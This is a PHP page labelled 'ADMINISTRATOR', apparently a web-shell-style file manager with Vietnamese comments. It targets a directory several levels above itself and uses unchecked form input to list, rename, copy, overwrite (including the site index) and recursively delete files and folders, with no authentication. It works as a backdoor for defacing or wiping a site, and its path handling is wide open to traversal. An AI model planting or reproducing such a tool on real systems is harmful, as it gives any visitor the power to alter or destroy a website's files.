<!DOCTYPE html>
<html>
	<head>
		<style>
			button{
			margin-top:10px;
			}
			.alert{
			color:#f00;
			}
		</style>
	</head>
	<body>
		
		<form action="" method="post">
			<fieldset>
				<legend>ADMINISTRATOR:</legend>
				File Old: <input type="text" name="file_old">
				File rename Or Folder: <input type="text" name="filename"><br>	
				<button name="scan">Scan Dir</button>
				<button name="rename">Rename</button>
				<button name="coppy">Coppy Index</button>
				<button name="delete-forder">Delete Forder</button>
			</fieldset>
		</form>
		<fieldset >
			<legend>Content Index:</legend>
			<textarea style="float:left" cols="80" rows="20">
				<?php					
					$content = file_get_contents('file_index.txt', true);
					echo $content
				?> 
			</textarea>
			<form action="" method="post">
				
				<textarea style="float:left; margin-left:7%"  cols="80" rows="20" name="content-index">
					
				</textarea></br>
				<input style="margin-left:55%" type="text" name="file_old">
				<button  name="edit-index">Edit Index</button>
			</form>
		</fieldset>
		
	</body>
</html>

<?php

    
	//$_SESSION['name']='11111';
	//echo $_SESSION['name'];
	$dir = "../../../../../";
	$index_file = 'index.php';
	
	// Quest Toan bo file va thu muc cua Website
	if(isset($_POST['scan'])){
	if (is_dir($dir)){ 
		if ($dh = opendir($dir)){ 
			while (($file = readdir($dh)) !== false){  
				echo $file .'</br>';  
				}    closedir($dh);  }}
	}
	
	//Doi ten 1 file bat ky o thu muc goc
	if(isset($_POST['rename'])){
		$file_old = $_POST['file_old'];
		$file_rename=$_POST['filename'];
		if($file_old == null || $file_rename == null){
			$alert = '<h4 class="alert" >Chua Nhap Cac Ten File</h4>';
			echo $alert;
			}else{	
		rename ($dir.$file_old, $dir.$file_rename);
		$alert = '<h4 class="alert" >Doi Ten File Thanh Cong</h4>';
		echo $alert;
			}
	}
	
	// Coppy Noi dung file Index
	if(isset($_POST['coppy'])){
		$file_old = $_POST['file_old'];		
		if($file_old == null){
			$alert = '<h4 class="alert" >Chua Nhap Cac Ten File</h4>';
			echo $alert;
		}else{
		$read_file = file($dir.$file_old) or die("Cannot read from file");
		foreach ($read_file as $key => $value) {
			$file_open = fopen('file_index.txt', 'a')or exit("khong tim thay file can mo");
			fwrite($file_open, $value . "\n");
		}
		}
	}		
	// Edit noi dung file Index
	if(isset($_POST['edit-index'])){
		$content = $_POST['content-index'];	
		$file_old = $_POST['file_old'];		
		if($file_old == null){
			$alert = '<h4 class="alert" >Chua Nhap Cac Ten File</h4>';
			echo $alert;
		}else{
		$file_open = fopen($dir.$file_old, 'w+')or exit("khong tim thay file can mo");
		fwrite($file_open, $content . "\n");
		}
	}
	//Xoa thu muc
	if(isset($_POST['delete-forder'])){
		$forder=$_POST['filename'];
		if($forder == null){
			$alert = '<h4 class="alert" >Chua Nhap Ten Thu Muc Can Xoa</h4>';
			echo $alert;
			}else{
			$url_path = $dir.$forder;
			rmdir_recurse($url_path);
			$alert = '<h4 class="alert" >Xoa Thu Muc Thanh Cong</h4>';
			echo $alert;
		}
	}
	// Ham xoa toan bo thu muc con va ca file trong thu muc cha		
	function rmdir_recurse($path) {
		$path = rtrim($path, '/').'/';
		$handle = opendir($path);
		while(false !== ($file = readdir($handle))) {
			if($file != '.' and $file != '..' ) {
				$fullpath = $path.$file;
				if(is_dir($fullpath)) rmdir_recurse($fullpath); else unlink($fullpath);
			}
		}
		closedir($handle);
		rmdir($path);
	}			